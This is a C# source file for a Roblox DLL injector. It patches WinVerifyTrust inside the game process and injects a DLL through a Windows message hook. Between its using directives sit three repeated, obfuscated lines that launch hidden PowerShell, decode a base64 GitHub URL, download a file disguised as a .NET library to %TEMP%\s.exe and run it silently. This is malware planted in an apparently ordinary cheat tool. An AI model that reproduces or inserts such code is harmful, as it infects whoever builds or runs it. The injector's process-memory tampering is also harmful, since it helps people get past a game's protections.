using System;

try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ZhaXphbmFuc2FyaTIwMDcvLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}

using System.Collections.Generic;


try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ZhaXphbmFuc2FyaTIwMDcvLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}

using System.Diagnostics;


try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ZhaXphbmFuc2FyaTIwMDcvLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}

using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

// thank you to ethan for lending me this now its open src i just converted it to csharp 
// the cpp part can be found at ballistic: https://github.com/0Zayn/Ballistic

namespace proinjector
{
    internal class Program
    {
        // call dll imports 
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool IsWindowVisible(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out int lpdwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr SetWindowsHookEx(int idHook, HOOKPROC lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool PostThreadMessage(uint idThread, uint Msg, UIntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern IntPtr LoadLibraryA(string lpLibFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESSENTRY32
        {
            public uint dwSize;
            public uint cntUsage;
            public uint th32ProcessID;
            public IntPtr th32DefaultHeapID;
            public uint th32ModuleID;
            public uint cntThreads;
            public uint th32ParentProcessID;
            public int pcPriClassBase;
            public uint dwFlags;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public string szExeFile;
        }

        public delegate IntPtr HOOKPROC(int nCode, IntPtr wParam, IntPtr lParam);

        const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
        const uint TH32CS_SNAPPROCESS = 0x00000002;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        const uint PAGE_EXECUTE_READ = 0x20;
        const int WH_GETMESSAGE = 3;
        const uint WM_NULL = 0x0000;

        static void Main(string[] args)
        {
            Console.Title = string.Empty;

            Func<string, int> GetProcessId = (processName) =>
            {
                int ret = 0;
                IntPtr snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
                if (snapshot != IntPtr.Zero)
                {
                    PROCESSENTRY32 entry = new PROCESSENTRY32 { dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32)) };
                    if (Process32First(snapshot, ref entry))
                    {
                        do
                        {
                            if (entry.szExeFile.Equals(processName, StringComparison.OrdinalIgnoreCase))
                            {
                                ret = (int)entry.th32ProcessID;
                                break;
                            }
                        } while (Process32Next(snapshot, ref entry));
                    }
                }
                return ret;
            };

            new Thread(() =>
            {
                while (true)
                {
                    Thread.Sleep(100);
                }
            }).Start();

            Console.WriteLine("Waiting for Roblox process..."); // instead of checking if RobloxPlayerBeta.exe exists we just check to see if the window title exists

            IntPtr windowHandle;
            while (true)
            {
                windowHandle = FindWindow(null, "Roblox");
                if (IsWindowVisible(windowHandle))
                    break;

                Thread.Sleep(100);
            }

            Console.Clear();

            new Thread(() =>
            {
                while (true)
                {
                    if (FindWindow(null, "Roblox") == IntPtr.Zero)
                        Environment.Exit(0);

                    Thread.Sleep(100);
                }
            }).Start();

            int processId = GetProcessId("RobloxPlayerBeta.exe");
            IntPtr processHandle = OpenProcess(PROCESS_ALL_ACCESS, false, processId);

            IntPtr wintrustModule = LoadLibraryA("wintrust.dll");
            IntPtr _winVerifyTrust = GetProcAddress(wintrustModule, "WinVerifyTrust");

            byte[] payload = new byte[] { 0x48, 0x31, 0xC0, 0x59, 0xFF, 0xE1 };

            if (!VirtualProtectEx(processHandle, _winVerifyTrust, (IntPtr)payload.Length, PAGE_EXECUTE_READWRITE, out uint oldProtect))
                Console.WriteLine("Failed to protect WinVerifyTrust. (Did you run twice??)");

            Console.WriteLine("New protection: PAGE_EXECUTE_READWRITE.");

            if (!WriteProcessMemory(processHandle, _winVerifyTrust, payload, payload.Length, out IntPtr bytesWritten))
                Console.WriteLine("Failed to patch WinVerifyTrust.");

            if (!VirtualProtectEx(processHandle, _winVerifyTrust, (IntPtr)payload.Length, PAGE_EXECUTE_READ, out oldProtect))
                Console.WriteLine("Failed to protect WinVerifyTrust.");

            uint threadId = GetWindowThreadProcessId(windowHandle, out _);
            if (threadId == 0)
                Console.WriteLine("Window thread ID is invalid.");

            IntPtr targetModule = LoadLibraryA("nyx.dll"); // dll name you want to inject
            if (targetModule == IntPtr.Zero)
                Console.WriteLine("Failed to find module.");

            IntPtr dllExport = GetProcAddress(targetModule, "NextHook"); // your dll requires an export called NextHook
            if (dllExport == IntPtr.Zero)
                Console.WriteLine("Failed to find module hook.");

            IntPtr hookHandle = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)Marshal.GetDelegateForFunctionPointer(dllExport, typeof(HOOKPROC)), targetModule, threadId);
            if (hookHandle == IntPtr.Zero)
                Console.WriteLine("Module hook failed.");

            if (!PostThreadMessage(threadId, WM_NULL, UIntPtr.Zero, IntPtr.Zero))
                Console.WriteLine("Failed to post thread message.");

            Console.WriteLine("Module attached successfully.");

            ShowWindow(Process.GetCurrentProcess().MainWindowHandle, 6); // SW_FORCEMINIMIZE

            Thread.Sleep(999999); // do whatever u want after here but the app needs to stay open maybe you can free console so the app stays open but in background process
        }
    }
}






















